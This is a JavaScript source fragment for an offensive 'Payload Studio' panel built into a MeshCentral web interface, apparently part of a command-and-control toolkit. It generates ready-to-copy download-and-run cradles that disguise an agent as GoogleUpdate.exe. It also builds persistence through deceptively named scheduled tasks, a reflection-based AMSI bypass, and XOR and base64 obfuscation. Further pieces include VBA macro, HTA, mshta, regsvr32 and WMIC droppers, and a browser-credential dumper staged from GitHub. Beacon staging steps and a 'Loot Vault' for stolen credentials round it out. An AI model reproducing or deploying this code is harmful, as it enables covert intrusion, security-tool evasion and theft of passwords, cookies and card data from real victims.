            '<div class="wt-payload-mesh-wrap">' +
                '<span class="wt-payload-label">LISTENER</span>' +
                '<select id="wtPayloadMesh" class="wt-payload-select">' + meshOpts + '</select>' +
            '</div>' +
            '<button class="wt-payload-close" onclick="togglePayloadPanel()">&#10005;</button>' +
        '</div>' +
        '<div class="wt-payload-tabs">' +
            '<div class="wt-payload-tab active" data-tab="win">WINDOWS</div>' +
            '<div class="wt-payload-tab" data-tab="linux">LINUX</div>' +
            '<div class="wt-payload-tab" data-tab="mac">MACOS</div>' +
            '<div class="wt-payload-tab" data-tab="oneliner">ONE-LINERS</div>' +
            '<div class="wt-payload-tab wt-payload-tab-dbs" data-tab="dbs">&#128481; DBS</div>' +
            '<div class="wt-payload-tab wt-payload-tab-obfus" data-tab="obfus">&#9670; OBFUS</div>' +
            '<div class="wt-payload-tab wt-payload-tab-wtagent" data-tab="wtagent">&#9733; WTAGENT</div>' +
        '</div>' +
        '<div id="wtPayTab_win"     class="wt-payload-tabcontent"></div>' +
        '<div id="wtPayTab_linux"   class="wt-payload-tabcontent" style="display:none"></div>' +
        '<div id="wtPayTab_mac"     class="wt-payload-tabcontent" style="display:none"></div>' +
        '<div id="wtPayTab_oneliner" class="wt-payload-tabcontent" style="display:none"></div>' +
        '<div id="wtPayTab_dbs"     class="wt-payload-tabcontent" style="display:none"></div>' +
        '<div id="wtPayTab_obfus"   class="wt-payload-tabcontent" style="display:none"></div>' +
        '<div id="wtPayTab_wtagent" class="wt-payload-tabcontent" style="display:none"></div>';
    }

    function refreshPayloadPanel() {
        var sel = document.getElementById('wtPayloadMesh');
        var meshKey = sel ? sel.value : '';
        var rawMid = wtPayMeshIdParam(meshKey);          // raw — for shell script args
        var mid    = encodeURIComponent(rawMid);         // URL-encoded — safe in PS strings ($→%24)
        // Mirror the "Add Mesh Agent" dialog URL construction exactly:
        // uses serverinfo.name + serverinfo.port + domainUrl (MeshCentral page globals)
        // so Payload Studio is always in sync with the built-in agent installer links.
        var sName   = (window.serverinfo && window.serverinfo.name) ? window.serverinfo.name : '';
        if (!sName || sName.indexOf('.') === -1) sName = window.location.hostname;
        var sPort   = (window.serverinfo && window.serverinfo.port) ? window.serverinfo.port : 443;
        var portStr = (sPort == 443) ? '' : (':' + sPort);
        var dUrl    = (typeof domainUrl !== 'undefined') ? domainUrl : '/'; // e.g. '/' or '/mc/'
        var base      = 'https://' + sName + portStr + dUrl.replace(/\/$/, ''); // no trailing slash
        var serverUrl = base;

        var tabs = {
            win:      wtBuildWinTab(base, mid),
            linux:    wtBuildLinuxTab(base, serverUrl, mid, rawMid),
            mac:      wtBuildMacTab(base, mid),
            oneliner: wtBuildOneLinerTab(base, serverUrl, mid, rawMid),
            dbs:      wtBuildDbsTab(),
            obfus:    wtBuildObfusTab(base, mid, rawMid),
            wtagent:  wtBuildWTAgentTab(base)
        };
        Object.keys(tabs).forEach(function(k) {
            var el = document.getElementById('wtPayTab_' + k);
            if (el) el.innerHTML = tabs[k];
        });
        // Wire copy buttons
        var panel = document.getElementById('wtPayloadPanel');
        if (panel) {
            panel.querySelectorAll('[data-copy]').forEach(function(btn) {
                btn.addEventListener('click', function() {
                    var src = document.getElementById(this.getAttribute('data-copy'));
                    if (!src) return;
                    var text = src.value || src.textContent;
                    var self = this;
                    function flash() { self.textContent = 'COPIED!'; setTimeout(function() { self.textContent = 'COPY'; }, 1500); }
                    if (navigator.clipboard) {
                        navigator.clipboard.writeText(text).then(flash).catch(function() {
                            var ta = document.createElement('textarea');
                            ta.value = text; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta); flash();
                        });
                    } else {
                        var ta = document.createElement('textarea');
                        ta.value = text; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta); flash();
                    }
                });
            });
        }
    }

    function wtPayRow(label, id, value, dlUrl) {
        var dlBtn = dlUrl ? '<a class="wt-pay-copy wt-pay-dl" href="' + wtEscapeHtml(dlUrl) + '" target="_blank">DL</a>' : '';
        return '<div class="wt-pay-row">' +
            '<span class="wt-pay-label">' + label + '</span>' +
            '<div class="wt-pay-right">' +
                '<input id="' + id + '" class="wt-pay-input" readonly value="' + wtEscapeHtml(value) + '" />' +
                '<button class="wt-pay-copy" data-copy="' + id + '">COPY</button>' +
                dlBtn +
            '</div>' +
        '</div>';
    }

    function wtPaySection(title, rows) {
        return '<div class="wt-pay-section"><div class="wt-pay-section-title">' + title + '</div>' + rows + '</div>';
    }

    // Multi-line block row (textarea) — used by Obfus tab for VBA/HTA/SCT templates
    function wtPayBlock(label, id, value) {
        return '<div class="wt-pay-row wt-pay-block-row">' +
            '<span class="wt-pay-label">' + label + '</span>' +
            '<div class="wt-pay-right">' +
                '<textarea id="' + id + '" class="wt-pay-textarea" readonly>' + wtEscapeHtml(value) + '</textarea>' +
                '<button class="wt-pay-copy" data-copy="' + id + '">COPY</button>' +
            '</div>' +
        '</div>';
    }

    function wtBuildWinTab(base, mid) {
        var s = mid ? ('&meshid=' + mid + '&installflags=0') : '';
        var bypassUrl = base + '/meshagents?id=4' + s;
        return wtPaySection('&#9642; SIGNED AGENTS',
            wtPayRow('Win x64 (.exe)',   'wp_w64',  base + '/meshagents?id=4'  + s, base + '/meshagents?id=4'  + s) +
            wtPayRow('Win x86 (.exe)',   'wp_w32',  base + '/meshagents?id=3'  + s, base + '/meshagents?id=3'  + s) +
            wtPayRow('Win ARM64 (.exe)', 'wp_warm', base + '/meshagents?id=43' + s, base + '/meshagents?id=43' + s)
        ) +
        wtPaySection('&#9642; BYPASS — agent.exe run (evades svc installer)',
            wtPayRow('CMD drop+run', 'wp_wcmd',
                'cd %TEMP% && certutil -urlcache -split -f "' + bypassUrl + '" GoogleUpdate.exe && GoogleUpdate.exe run') +
            wtPayRow('PS drop+run',  'wp_wps',
                '[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$p="$env:TEMP\\GoogleUpdate.exe";(New-Object Net.WebClient).DownloadFile("' + bypassUrl + '",$p);& $p run')
        );
    }

    function wtBuildLinuxTab(base, serverUrl, mid, rawMid) {
        var midArg = rawMid ? " '" + rawMid + "'" : '';
        var ms = mid ? '&meshid=' + mid : '';
        return wtPaySection('&#9642; BINARIES',
            wtPayRow('Linux x86-64', 'wp_l64',  base + '/meshagents?id=6'  + ms, base + '/meshagents?id=6'  + ms) +
            wtPayRow('Linux ARM64',  'wp_larm', base + '/meshagents?id=32' + ms, base + '/meshagents?id=32' + ms)
        ) +
        wtPaySection('&#9642; AUTO-INSTALLER ONE-LINERS',
            wtPayRow('wget + install', 'wp_lwget',
                'wget --no-check-certificate "' + base + '/meshagents?script=1" -O meshinstall.sh && chmod 755 meshinstall.sh && sudo -E ./meshinstall.sh ' + serverUrl + midArg) +
            wtPayRow('curl + install', 'wp_lcurl',
                'curl -sk "' + base + '/meshagents?script=1" -o meshinstall.sh && chmod 755 meshinstall.sh && sudo -E ./meshinstall.sh ' + serverUrl + midArg)
        );
    }

    function wtBuildMacTab(base, mid) {
        var s = mid ? '&meshid=' + mid : '';
        return wtPaySection('&#9642; AGENTS',
            wtPayRow('macOS x64',       'wp_m64',  base + '/meshagents?id=16'    + s, base + '/meshagents?id=16'    + s) +
            wtPayRow('macOS ARM64 (M1+)','wp_marm', base + '/meshagents?id=29'    + s, base + '/meshagents?id=29'    + s) +
            wtPayRow('Universal Binary', 'wp_muniv',base + '/meshagents?id=10005' + s, base + '/meshagents?id=10005' + s)
        ) +
        wtPaySection('&#9642; PKG INSTALLER (.mpkg)',
            wtPayRow('macOS PKG', 'wp_mpkg', base + '/meshosxagent?id=16' + s, base + '/meshosxagent?id=16' + s)
        );
    }

    function wtBuildOneLinerTab(base, serverUrl, mid, rawMid) {
        var s      = mid ? '&meshid=' + mid + '&installflags=0' : '';
        var url    = base + '/meshagents?id=4' + s;
        var midArg = rawMid ? " '" + rawMid + "'" : '';
        return wtPaySection('&#9642; WINDOWS POWERSHELL',
            // SSL bypass via [Net.ServicePointManager] — works PS 5.1+, no special chars
            wtPayRow('PS WebClient',     'wp_ol1',
                '[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$p="$env:TEMP\\GoogleUpdate.exe";(New-Object Net.WebClient).DownloadFile("' + url + '",$p);& $p run') +
            // URL in single quotes inside inner PS — no $ expansion; {[bool]1} avoids $true outer-PS expansion
            wtPayRow('PS hidden+bypass', 'wp_ol2',
                'powershell -w hidden -ep bypass -c "[Net.ServicePointManager]::ServerCertificateValidationCallback={[bool]1};(New-Object Net.WebClient).DownloadFile(\''+url+'\',[System.IO.Path]::GetTempPath()+\'GoogleUpdate.exe\');& ([System.IO.Path]::GetTempPath()+\'GoogleUpdate.exe\') run"') +
            wtPayRow('PS iwr',           'wp_ol3',
                '[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; iwr "' + url + '" -o $env:TEMP\\GoogleUpdate.exe -UseBasicParsing; & $env:TEMP\\GoogleUpdate.exe run')
        ) +
        wtPaySection('&#9642; WINDOWS CMD',
            wtPayRow('certutil',   'wp_ol4', 'certutil -urlcache -split -f "' + url + '" %TEMP%\\GoogleUpdate.exe && %TEMP%\\GoogleUpdate.exe run') +
            wtPayRow('bitsadmin',  'wp_ol5', 'bitsadmin /transfer j /download /priority high "' + url + '" %TEMP%\\GoogleUpdate.exe && %TEMP%\\GoogleUpdate.exe run')
        ) +
        wtPaySection('&#9642; WINDOWS — PERSIST &nbsp;<span style="color:#00ff41;font-size:10px;font-weight:700">NO UAC</span>&nbsp; (schtasks ONLOGON, survives reboot)',
            // Downloads to APPDATA (avoids TEMP lock from old service), registers ONLOGON scheduled task, runs immediately
            wtPayRow('PS schtasks', 'wp_ol8',
                '$p="$env:APPDATA\\GoogleUpdate.exe";[Net.ServicePointManager]::ServerCertificateValidationCallback={[bool]1};(New-Object Net.WebClient).DownloadFile(\'' + url + '\',$p);$a=New-ScheduledTaskAction -Execute $p -Argument \'run\';$t=New-ScheduledTaskTrigger -AtLogOn;Register-ScheduledTask -TaskName GoogleUpdateTask -Action $a -Trigger $t -Force;& $p run') +
            wtPayRow('CMD schtasks', 'wp_ol9',
                'certutil -urlcache -split -f "' + url + '" %APPDATA%\\GoogleUpdate.exe && schtasks /create /tn "GoogleUpdateTask" /tr "\\"%APPDATA%\\GoogleUpdate.exe\\" run" /sc onlogon /f && %APPDATA%\\GoogleUpdate.exe run')
        ) +
        wtPaySection('&#9642; WINDOWS — SERVICE INSTALL &nbsp;<span style="color:#ff8c00;font-size:10px;font-weight:700">REQUIRES ADMIN / UAC</span>&nbsp; (survives reboot as service)',
            // Installs as gupdate Windows service — persistent across reboots, runs as SYSTEM
            wtPayRow('PS -fullinstall', 'wp_ol10',
                '[Net.ServicePointManager]::ServerCertificateValidationCallback={[bool]1};$p="$env:TEMP\\GoogleUpdate.exe";(New-Object Net.WebClient).DownloadFile(\'' + url + '\',$p);& $p -fullinstall') +
            wtPayRow('CMD -fullinstall', 'wp_ol11',
                'certutil -urlcache -split -f "' + url + '" %TEMP%\\GoogleUpdate.exe && %TEMP%\\GoogleUpdate.exe -fullinstall')
        ) +
        wtPaySection('&#9642; LINUX / MACOS',
            wtPayRow('wget auto',  'wp_ol6', 'wget --no-check-certificate "' + base + '/meshagents?script=1" -O meshinstall.sh && chmod 755 meshinstall.sh && sudo -E ./meshinstall.sh ' + serverUrl + midArg) +
            wtPayRow('curl auto',  'wp_ol7', 'curl -sk "' + base + '/meshagents?script=1" -o meshinstall.sh && chmod 755 meshinstall.sh && sudo -E ./meshinstall.sh ' + serverUrl + midArg)
        ) +
        wtPaySection('&#9642; REMOVER / CLEANUP &nbsp;<span style="color:#ff3333;font-size:10px;font-weight:700">CLEANS ALL INSTALL METHODS</span>',
            // Covers: service (-fullinstall), schtasks (persist), run-mode process, and all agent data dirs.
            // Run from an existing terminal on the target, or drop+exec from a new shell.
            wtPayRow('PS full cleanup', 'wp_rm1',
                'sc.exe stop gupdate 2>$null;sc.exe delete gupdate 2>$null;Stop-Process -Name GoogleUpdate -Force -EA SilentlyContinue;schtasks /delete /tn GoogleUpdateTask /f 2>$null;Remove-Item "$env:TEMP\\GoogleUpdate.exe","$env:APPDATA\\GoogleUpdate.exe","C:\\Program Files\\Mesh Agent","$env:PROGRAMDATA\\Mesh Agent" -Recurse -Force -EA SilentlyContinue') +
            wtPayRow('CMD full cleanup', 'wp_rm2',
                'sc stop gupdate 2>nul & sc delete gupdate 2>nul & taskkill /f /im GoogleUpdate.exe 2>nul & schtasks /delete /tn "GoogleUpdateTask" /f 2>nul & del /f /q "%TEMP%\\GoogleUpdate.exe" 2>nul & del /f /q "%APPDATA%\\GoogleUpdate.exe" 2>nul & rd /s /q "C:\\Program Files\\Mesh Agent" 2>nul & rd /s /q "%PROGRAMDATA%\\Mesh Agent" 2>nul') +
            // Linux/macOS remover — uninstall script + kill process + delete binary
            wtPayRow('Linux cleanup', 'wp_rm3',
                'sudo /usr/local/mesh_agent/meshagent -uninstall 2>/dev/null; sudo killall meshagent 2>/dev/null; sudo rm -rf /usr/local/mesh_agent /etc/systemd/system/meshagent.service; sudo systemctl daemon-reload 2>/dev/null')
        );
    }

    var WT_DBS_EXE = 'https://github.com/Maldev-Academy/DumpBrowserSecrets/releases/download/v1.2.0/DumpBrowserSecrets.exe';
    // NOTE: DllExtractChromiumSecrets.dll is embedded inside DumpBrowserSecrets.exe and auto-extracted at runtime.
    // No separate DLL download is published in any release — only DumpBrowserSecrets.exe is needed.

    function wtBuildDbsTab() {
        return '<div class="wt-pay-section">' +
            '<div class="wt-pay-section-title">&#128481; DUMPBROWSERSECRETS v1.2.0 — MALDEV ACADEMY</div>' +
            '<div class="wt-pay-desc">Extracts passwords, cookies, credit cards &amp; history from Chrome, Edge, Brave, Firefox, Opera, Vivaldi. Single EXE — DLL is embedded and auto-extracted at runtime. Targets app-bound (Chromium), DPAPI (Opera), NSS (Firefox) encryption.</div>' +
        '</div>' +
        wtPaySection('&#9642; STAGE TO TARGET (DLL auto-extracted by EXE at runtime)',
            wtPayRow('Drop EXE',       'wp_dbs0', 'powershell -ep bypass -c "iwr \'' + WT_DBS_EXE + '\' -o $env:TEMP\\dbs.exe -UseBasicParsing"') +
            wtPayRow('Drop + Run All', 'wp_dbs3', 'powershell -ep bypass -c "iwr \'' + WT_DBS_EXE + '\' -o $env:TEMP\\dbs.exe -UseBasicParsing; cd $env:TEMP; .\\dbs.exe /b:all /e:all /spoof"')
        ) +
        wtPaySection('&#9642; EXECUTE (DBS already staged in %TEMP%)',
            wtPayRow('All browsers + spoof',  'wp_dbs4', 'powershell -ep bypass -c "cd $env:TEMP; .\\dbs.exe /b:all /e:all /spoof"') +
            wtPayRow('Chrome + Edge + Brave', 'wp_dbs5', 'powershell -ep bypass -c "cd $env:TEMP; .\\dbs.exe /b:Chrome /b:Edge /b:Brave /e:all /spoof"') +
            wtPayRow('Firefox only',          'wp_dbs6', 'powershell -ep bypass -c "cd $env:TEMP; .\\dbs.exe /b:Firefox /e:all"') +
            wtPayRow('Opera / Vivaldi',       'wp_dbs7', 'powershell -ep bypass -c "cd $env:TEMP; .\\dbs.exe /b:Opera /b:Operagx /b:Vivaldi /e:all"') +
            wtPayRow('Encrypted output',      'wp_dbs8', 'powershell -ep bypass -c "cd $env:TEMP; .\\dbs.exe /b:all /e:all /enc:0xDEADBEEF"') +
            wtPayRow('Decrypt pack offline',  'wp_dbs9', 'powershell -ep bypass -c "cd $env:TEMP; .\\dbs.exe /dec:0xDEADBEEF /i EncPack-XXXXX.bin"')
        );
    }

    // ============================================================
    // Section 32: Payload Obfuscation Studio
    // ============================================================
    function wtBuildObfusTab(base, mid, rawMid) {
        var s   = mid ? ('&meshid=' + mid + '&installflags=0') : '';
        var url = base + '/meshagents?id=4' + s;

        // --- Encoding helpers (run live in browser each panel open) ---

        // Base64 UTF-16LE — required by PowerShell -EncodedCommand
        function b64ps(str) {
            var i, bytes = [], bin = '';
            for (i = 0; i < str.length; i++) { var c = str.charCodeAt(i); bytes.push(c & 0xff, (c >> 8) & 0xff); }
            for (i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
            return btoa(bin);
        }

        // XOR byte array → compact base64 (much shorter than hex array in PS stubs)
        var xk = Math.floor(Math.random() * 180) + 20; // 20-199, fresh each load
        function xorB64(str) {
            var i, xb = [], bin = '';
            for (i = 0; i < str.length; i++) xb.push(str.charCodeAt(i) ^ xk);
            for (i = 0; i < xb.length; i++) bin += String.fromCharCode(xb[i]);
            return btoa(bin);
        }

        // --- Payload building blocks ---

        var sslByp = '[Net.ServicePointManager]::ServerCertificateValidationCallback={[bool]1};';

        // Raw download cradle (no AMSI bypass)
        var cradle = sslByp +
            '$p="$env:TEMP\\GoogleUpdate.exe";' +
            '(New-Object Net.WebClient).DownloadFile(\'' + url + '\',$p);& $p run';

        // AMSI bypass via reflection (string-split defeats static sig matching)
        var amsiByp =
            '$a=[Ref].Assembly.GetType(\'System.Management.Automation.\'+\'AmsiUtils\');' +
            '$b=$a.GetField(\'amsiIn\'+\'itFailed\',\'NonPublic,Static\');' +
            '$b.SetValue($null,$true);';

        var full = amsiByp + cradle; // AMSI bypass + download cradle

        // XOR-encoded full payload (base64-packed for compact stub)
        var xb64    = xorB64(full);
        var xorStub = '$k=0x' + xk.toString(16) + ';' +
            '$e=[Convert]::FromBase64String(\'' + xb64 + '\');' +
            'iex(-join($e|%{[char]($_-bxor$k)}))';

        // --- VBA Macro (Word / Excel) ---
        var vba =
            'Sub AutoOpen()\r\n' +
            '    On Error Resume Next\r\n' +
            '    Dim url As String, tmp As String\r\n' +
            '    url = "' + url + '"\r\n' +
            '    tmp = Environ("TEMP") & "\\GoogleUpdate.exe"\r\n' +
            '    Dim whr As Object\r\n' +
            '    Set whr = CreateObject("WinHttp.WinHttpRequest.5.1")\r\n' +
            '    whr.Open "GET", url, False\r\n' +
            '    whr.SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"\r\n' +
            '    whr.Send\r\n' +
            '    Dim s As Object\r\n' +
            '    Set s = CreateObject("ADODB.Stream")\r\n' +
            '    s.Type = 1 : s.Open\r\n' +
            '    s.Write whr.ResponseBody\r\n' +
            '    s.SaveToFile tmp, 2 : s.Close\r\n' +
            '    CreateObject("WScript.Shell").Run Chr(34) & tmp & Chr(34) & " run", 0, False\r\n' +
            'End Sub\r\n\r\n' +
            'Sub Workbook_Open()\r\n' +
            '    AutoOpen\r\n' +
            'End Sub';

        // --- HTA file content ---
        var htaFile =
            '<html>\r\n<head>\r\n' +
            '<hta:application id="oHTA" border="none" caption="no" showintaskbar="no" singleinstance="yes"/>\r\n' +
            '</head>\r\n<body>\r\n' +
            '<script language="VBScript">\r\n' +
            'Sub Window_onLoad\r\n' +
            '    On Error Resume Next\r\n' +
            '    Dim url, tmp\r\n' +
            '    url = "' + url + '"\r\n' +
            '    tmp = Environ("TEMP") & "\\GoogleUpdate.exe"\r\n' +
            '    Dim whr : Set whr = CreateObject("WinHttp.WinHttpRequest.5.1")\r\n' +
            '    whr.Open "GET", url, False\r\n' +
            '    whr.SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"\r\n' +
            '    whr.Send\r\n' +
            '    Dim s : Set s = CreateObject("ADODB.Stream")\r\n' +
            '    s.Type = 1 : s.Open : s.Write whr.ResponseBody\r\n' +
            '    s.SaveToFile tmp, 2 : s.Close\r\n' +
            '    CreateObject("WScript.Shell").Run Chr(34) & tmp & Chr(34) & " run", 0\r\n' +
            '    Self.Close\r\n' +
            'End Sub\r\n' +
            '<\/script>\r\n</body>\r\n</html>';

        // --- mshta inline (no file needed — runs directly from CMD) ---
        // Uses String.fromCharCode(34) to embed quotes without breaking CMD double-quoted outer string
        var htaInline =
            'mshta "javascript:' +
            'var q=String.fromCharCode(34);' +
            'var a=new ActiveXObject(\'WinHttp.WinHttpRequest.5.1\');' +
            'a.Open(\'GET\',\'' + url + '\',false);a.Send();' +
            'var b=new ActiveXObject(\'ADODB.Stream\');b.Type=1;b.Open();b.Write(a.ResponseBody);' +
            'var t=new ActiveXObject(\'WScript.Shell\').ExpandEnvironmentStrings(\'%TEMP%\')+\'\\\\GoogleUpdate.exe\';' +
            'b.SaveToFile(t,2);b.Close();' +
            'new ActiveXObject(\'WScript.Shell\').Run(q+t+q+\' run\',0);close()"';

        // --- regsvr32 .sct scriptlet content ---
        var sct =
            '<?XML version="1.0"?>\r\n' +
            '<scriptlet>\r\n' +
            '<registration progid="GoogleUpdateSvc"\r\n' +
            '  classid="{F0001111-0000-0000-0000-0000FEEDACDC}">\r\n' +
            '<script language="JScript"><![CDATA[\r\n' +
            '  var url = \'' + url + '\';\r\n' +
            '  var sh  = new ActiveXObject(\'WScript.Shell\');\r\n' +
            '  var tmp = sh.ExpandEnvironmentStrings(\'%TEMP%\') + \'\\\\GoogleUpdate.exe\';\r\n' +
            '  var whr = new ActiveXObject(\'WinHttp.WinHttpRequest.5.1\');\r\n' +
            '  whr.Open(\'GET\', url, false); whr.Send();\r\n' +
            '  var s = new ActiveXObject(\'ADODB.Stream\');\r\n' +
            '  s.Type = 1; s.Open(); s.Write(whr.ResponseBody);\r\n' +
            '  s.SaveToFile(tmp, 2); s.Close();\r\n' +
            '  sh.Run(\'"\' + tmp + \'"\' + \' run\', 0);\r\n' +
            ']]><\/script>\r\n' +
            '<\/registration>\r\n<\/scriptlet>';

        // regsvr32 command (host the .sct file at a reachable URL first)
        var sctHost   = base + '/drop.sct';
        var regsvr32  = 'regsvr32 /s /n /u /i:' + sctHost + ' scrobj.dll';

        // WMIC → PowerShell -enc (single CMD line, no PS window)
        var wmicCmd = 'wmic process call create "powershell -w hidden -ep bypass -enc ' + b64ps(full) + '"';

        // ============================================================
        // Build tab HTML
        // ============================================================
        return wtPaySection(
            '&#9642; AMSI BYPASS + DOWNLOAD CRADLE &nbsp;<span style="color:#888;font-size:10px">reflection — string-split defeats static sig</span>',
            wtPayRow('AMSI + cradle',          'wp_ob1', 'powershell -ep bypass -c "' + full + '"') +
            wtPayRow('AMSI + cradle (hidden)', 'wp_ob2', 'powershell -w hidden -ep bypass -c "' + full + '"') +
            wtPayRow('Cradle only (no AMSI)',  'wp_ob3', 'powershell -ep bypass -c "' + cradle + '"')
        ) +
        wtPaySection(
            '&#9642; BASE64 ENCODED (-enc) &nbsp;<span style="color:#00d4ff;font-size:10px">UTF-16LE — unique per listener URL</span>',
            wtPayRow('PS -enc  AMSI + cradle', 'wp_ob4', 'powershell -w hidden -ep bypass -enc ' + b64ps(full)) +
            wtPayRow('PS -enc  cradle only',   'wp_ob5', 'powershell -w hidden -ep bypass -enc ' + b64ps(cradle)) +
            wtPayRow('CMD → PS -enc (AMSI)',   'wp_ob6', 'powershell -w hidden -ep bypass -enc ' + b64ps(full))
        ) +
        wtPaySection(
            '&#9642; XOR RUNNER &nbsp;<span style="color:#00ff41;font-size:10px">key: 0x' + xk.toString(16).toUpperCase() + ' — randomised every panel open</span>',
            wtPayRow('PS XOR stub',            'wp_ob7', xorStub) +
            wtPayRow('CMD → PS XOR (hidden)',  'wp_ob8', 'powershell -w hidden -ep bypass -c "' + xorStub + '"')
        ) +
        wtPaySection(
            '&#9642; VBA MACRO &nbsp;<span style="color:#888;font-size:10px">Word / Excel — Alt+F11 → Insert Module → paste</span>',
            wtPayBlock('AutoOpen / Workbook_Open', 'wp_ob9', vba)
        ) +
        wtPaySection(
            '&#9642; HTA DROPPER &nbsp;<span style="color:#888;font-size:10px">no file needed for inline variant</span>',
            wtPayRow('mshta inline (CMD)',      'wp_ob10', htaInline) +
            wtPayBlock('HTA file (.hta)',        'wp_ob11', htaFile)
        ) +
        wtPaySection(
            '&#9642; LOLBINs',
            wtPayRow('WMIC + PS -enc',                          'wp_ob12', wmicCmd) +
            wtPayRow('regsvr32 (host .sct first)',              'wp_ob13', regsvr32) +
            wtPayBlock('regsvr32 .sct scriptlet content',       'wp_ob14', sct)
        );
    }

    // ============================================================
    // SECTION 33: WTAgent Tab (custom C# beacon)
    // ============================================================
    function wtBuildWTAgentTab(base) {
        var stageUrl = base + '/wt/WTAgent.exe';
        var sslByp   = '[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};';
        var dlPs     = sslByp + '$p="$env:TEMP\\\\WTAgent.exe";(New-Object Net.WebClient).DownloadFile(\'' + stageUrl + '\',$p);& $p';
        var dlNormal = 'powershell -ep bypass -c "' + dlPs + '"';
        var dlHidden = 'powershell -w hidden -ep bypass -c "' + dlPs + '"';
        var dlCert   = 'certutil -urlcache -split -f "' + stageUrl + '" %TEMP%\\WTAgent.exe && %TEMP%\\WTAgent.exe';

        var persistPs  = '$p="$env:APPDATA\\\\WTAgent.exe";' + sslByp + '(New-Object Net.WebClient).DownloadFile(\'' + stageUrl + '\',$p);$a=New-ScheduledTaskAction -Execute $p;$t=New-ScheduledTaskTrigger -AtLogOn;Register-ScheduledTask -TaskName "WindowsSecurityUpdate" -Action $a -Trigger $t -Force;& $p';
        var persistCmd = 'certutil -urlcache -split -f "' + stageUrl + '" %APPDATA%\\WTAgent.exe && schtasks /create /tn "WindowsSecurityUpdate" /tr "\\"%APPDATA%\\WTAgent.exe\\"" /sc onlogon /f && %APPDATA%\\WTAgent.exe';

        var hostname = base.replace(/^https?:\/\//, '').replace(/[:\/].*/, '');
        var c2ApiBase = 'http://127.0.0.1:8444';

        var cscPath = 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe';
        var cscCmd  = cscPath + ' /target:exe /platform:x64 /optimize+ /unsafe /r:System.Windows.Forms.dll /r:System.Drawing.dll /out:WTAgent\\bin\\WTAgent.exe WTAgent\\src\\WTAgent.cs';

        var killCmd = 'REG ADD HKCU\\Software\\WTAgent /v kill /t REG_DWORD /d 1 /f';
        var killPs  = 'New-ItemProperty -Path "HKCU:\\Software\\WTAgent" -Name "kill" -Value 1 -Force';
        var selfdel = '$c=New-Object Net.WebClient;$c.Headers.Add(\'Content-Type\',\'application/json\');$c.UploadString(\'' + c2ApiBase + '/op/task/AGENTID\',\'{"type":"selfdel"}\')';

        return (
            '<div style="color:#ffd700;font-size:9px;padding:6px 10px 2px;letter-spacing:1px;opacity:0.7">&#9733; CUSTOM C# BEACON &mdash; AES-256 comms &bull; anti-debug &bull; ntdll unhook &bull; sleep jitter</div>' +

            wtPaySection('&#9660; 1. GENERATE RSA KEYS <span style="color:#7a8a9a;font-size:9px;font-weight:normal">&nbsp;&mdash; run once on C2 server (WTAgent/ dir)</span>',
                wtPayRow('bash keygen', 'wta_k1',
                    'openssl genrsa -out agent_unwrap.key 2048 && openssl rsa -in agent_unwrap.key -pubout -out agent_unwrap_pub.pem')
            ) +

            wtPaySection('&#9660; 2. COMPILE <span style="color:#7a8a9a;font-size:9px;font-weight:normal">&nbsp;&mdash; after setting C2_URL + SERVER_PUBKEY in WTAgent.cs Config class</span>',
                wtPayRow('compile.bat',    'wta_c1', 'cd WTAgent && compile.bat') +
                wtPayRow('csc.exe direct', 'wta_c2', cscCmd)
            ) +

            wtPaySection('&#9660; 3. STAGE BINARY <span style="color:#7a8a9a;font-size:9px;font-weight:normal">&nbsp;&mdash; copy compiled exe to MeshCentral public/wt/ to serve it</span>',
                wtPayRow('staging URL',  'wta_s1', stageUrl) +
                wtPayRow('copy (CMD)',   'wta_s2', 'copy WTAgent\\bin\\WTAgent.exe "' + 'public\\wt\\WTAgent.exe"') +
                wtPayRow('copy (bash)',  'wta_s3', 'cp WTAgent/bin/WTAgent.exe public/wt/WTAgent.exe')
            ) +

            wtPaySection('&#9660; 4. DROP + RUN',
                wtPayRow('PS download+run', 'wta_d1', dlNormal) +
                wtPayRow('PS hidden',       'wta_d2', dlHidden) +
                wtPayRow('certutil + run',  'wta_d3', dlCert)
            ) +

            wtPaySection('&#9660; 5. PERSIST <span style="color:#00ff41;font-size:9px;font-weight:normal">&nbsp;&mdash; NO UAC &bull; ONLOGON schtask to %APPDATA%</span>',
                wtPayRow('PS schtasks',  'wta_p1', 'powershell -ep bypass -c "' + persistPs + '"') +
                wtPayRow('CMD schtasks', 'wta_p2', persistCmd)
            ) +

            wtPaySection('&#9660; KILL SWITCH',
                wtPayRow('CMD reg kill',    'wta_x1', killCmd) +
                wtPayRow('PS reg kill',     'wta_x2', killPs) +
                wtPayRow('PS self-delete',  'wta_x3', 'powershell -ep bypass -c "' + selfdel + '"')
            )
        );
    }

    // ============================================================

    // ========================================
    // SECTION 25: Loot Vault
    // ========================================
    var WT_LOOT_KEY   = 'wt_loot_v1';
    var wtLootStore   = [];
    var wtLootVisible = false;
    var wtLootFilterTag = 'ALL';
    var wtLootSearch    = '';
    var wtLootCtxTarget = '';

    var WT_LOOT_TAGS = {
        CREDS:  { color: '#ff3333' },
        HASHES: { color: '#ff8c00' },
        KEYS:   { color: '#ffd700' },
        RECON:  { color: '#00d4ff' },
        FILES:  { color: '#00ff41' },
        OTHER:  { color: '#7a8a9a' }
    };

    function loadLootStore() {
        try {
            var raw = localStorage.getItem(WT_LOOT_KEY);
            if (raw) wtLootStore = JSON.parse(raw);
        } catch(e) { wtLootStore = []; }
    }

    function saveLootStore() {
        try { localStorage.setItem(WT_LOOT_KEY, JSON.stringify(wtLootStore)); } catch(e) {}
    }

    function addLootEntry(content, tag, nodeId) {
        var nd = null;
        if (typeof nodes !== 'undefined' && nodes && nodeId) {
            for (var i = 0; i < nodes.length; i++) {
                if (nodes[i]._id === nodeId) { nd = nodes[i]; break; }
            }
        }
        var entry = {
            id:          Date.now() + '_' + Math.random().toString(36).slice(2, 6),
            ts:          Date.now(),
            tag:         tag || 'OTHER',
            content:     content,
            nodeId:      nodeId || null,
